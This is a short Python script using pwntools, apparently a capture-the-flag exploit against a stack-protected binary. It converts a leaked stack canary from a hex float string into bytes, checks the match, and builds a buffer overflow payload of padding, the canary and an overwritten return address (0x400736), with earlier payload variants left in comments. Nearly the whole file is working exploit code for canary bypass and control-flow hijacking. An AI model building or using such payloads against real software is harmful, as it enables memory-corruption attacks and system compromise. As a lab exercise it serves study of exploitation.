import pwn
import struct
true_canary_bytes = pwn.p64(0x5e8d7f0a18a41900)
print(true_canary_bytes)
our_canary_hex_double_string = '0x1.d7f0a18a419p+489'
bytes_our_canary = struct.pack('<d', float.fromhex(our_canary_hex_double_string))
print(bytes_our_canary)
print(true_canary_bytes == bytes_our_canary)
# print(b'A'*10 + bytes_our_canary)
# print(b'A'*22 + pwn.p64(0x0000000000400656, endian='little'))
# print(b'AAAAAAAAAA\xe1\xb9K\xf4\xd2\xaaG\x826\x07@\x00\x00\x00\x00\x00'.hex())


print((b'A'*10 + bytes_our_canary + pwn.p64(0x0000000000400736)).hex())